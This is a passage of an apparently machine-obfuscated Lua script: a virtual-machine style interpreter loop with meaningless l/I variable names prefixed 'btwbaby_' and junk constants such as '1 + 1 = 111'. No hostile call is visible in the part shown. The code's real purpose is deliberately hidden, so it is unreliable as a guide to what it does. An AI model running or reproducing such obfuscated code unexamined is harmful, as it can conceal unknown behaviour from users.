111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{222;636;825;306};"1 + 1 = 111";{922;509;729;770};"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Y3")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("7jm")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("U7")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{273;512;719;511};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("XG")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("hOq")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("PW")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("kak")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{47;278;491;471};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("pOh")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("i7rl")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("39")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("tBA")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ATl0")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Jj")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dnN")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mm")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{916;996;677;646};{24;60;496;751};"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("01QT")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Df")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("a3P")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0O")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Mio")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qv")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("XpG")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("c9")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#{{323;168;179;666};{858;716;728;505};"1 + 1 = 111";}]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9h")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("g0W")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("crBH")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("By")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Vts")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("t0")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("TNb")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Nuru")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("F0")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{222;95;700;633};{664;286;826;87};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8a")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("atC")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("nF")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("utk")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("OL")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("zQx")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Oq")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#{{699;876;127;874};"1 + 1 = 111";"1 + 1 = 111";}]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("87")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("SC3")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4y")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("kem")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("rYvv")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8x")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Kih")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("lhIM")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("J4")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hl0")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zi")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";{392;988;618;10};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("rXqF")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("l3")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("OoZ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("n8")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("PPj")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("F1")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{452;803;320;862};"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ad")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("8du")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0y")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("2W9")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("jSXU")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eu")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("gVR")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{541;171;817;179};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("AD")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ml9")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Yz")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZuU")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("XQ7k")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("QG")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Bct")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GA")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("MgE")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{15;169;646;251};{339;896;138;100};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("5hU")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("FD")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("GY9")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("uA")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#{{289;941;379;670};{73;432;645;845};"1 + 1 = 111";}]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("MD")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("vcF")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("og5S")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("n4")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("HOK")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ki")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Q6p")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("cGu5")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("DF")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ed2")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("4TYP")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("c9")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("T1G")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZeW6")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ux")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("rEb")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Fy2n")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4I")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("buP")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("W8")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("l5v")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("eLLW")]];end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("36bHrCWEHCjR1ltcu9m2Ubo4iNVqPSDbln8j8X0UscC27t2idrci7jI1S")then if btwbaby_IIlIllIIlIlIIlIIIl<=#("zPQFYZ9hGOmkeIiDKSKv6YUNnyPtebQgC1ykeXoM3ZXo52mFaFJ0r")then if btwbaby_IIlIllIIlIlIIlIIIl<=#("jK5dqAkPdE7gTnj7yWD8DhaFRukjtKC0ZeRYpaHYBnWtrZj9vdg")then if btwbaby_IIlIllIIlIlIIlIIIl==#("xt3cJBv5obvDbhqOGvRxpPHovRn2llYqEQDFlPoZPLJA2srjIG")then local btwbaby_IIIllIlIIlI=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ie")]local btwbaby_IllIIlllIIIIlIllIl={btwbaby_llllIllI[btwbaby_IIIllIlIIlI](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIIllIlIIlI+1,btwbaby_lIlIIllIllIlIIlI))};local btwbaby_llIIllIll=0;for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI,btwbaby_IllIIIllIlIIIIIlIIIllII[#("Fky7")]do btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_llIIllIll];end else btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#("kmm")];end;elseif btwbaby_IIlIllIIlIlIIlIIIl>#("avTHSXOQ2mEUcme9vOWD1g2SOfgxdAdtQTY4ViVSH8xMl1GmXs5G")then local btwbaby_llIlIIIl;local btwbaby_llIIIlIlllll,btwbaby_IlIlIIllIIlIIIIllIIIIll;local btwbaby_lIIIlIIIIllllIlIllllI;local btwbaby_IIlIllIIlIlIIlIIIl;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Fv")]]={};btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("PT")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("HC6")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("k2JL")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("IY")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GaZ")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("tL")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2h1")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ny2p")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hf")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("5du")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1zIv")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Fc")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mzp")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("H3")];btwbaby_lIIIlIIIIllllIlIllllI=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("bG0")]];btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]=btwbaby_lIIIlIIIIllllIlIllllI;btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_lIIIlIIIIllllIlIllllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("T4as")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Qj")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8lr")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("KiB")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Z0")]btwbaby_llIIIlIlllll,btwbaby_IlIlIIllIIlIIIIllIIIIll=btwbaby_lIllllllIIllIIlIll(btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]))btwbaby_lIlIIllIllIlIIlI=btwbaby_IlIlIIllIIlIIIIllIIIIll+btwbaby_IIlIllIIlIlIIlIIIl-1 btwbaby_llIlIIIl=0;for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIlIllIIlIlIIlIIIl,btwbaby_lIlIIllIllIlIIlI do btwbaby_llIlIIIl=btwbaby_llIlIIIl+1;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_llIIIlIlllll[btwbaby_llIlIIIl];end;btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("PP")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_lIlIIllIllIlIIlI))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];do return end;else local btwbaby_IIlIllIIlIlIIlIIIl;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ff")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("1FA")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dY")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("5Ho")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("OE")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("Och")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Rb")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("EmD")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0oRk")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8W")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Kx4")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("B5I5")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eq")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("7uv")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Uv1b")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Hb")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 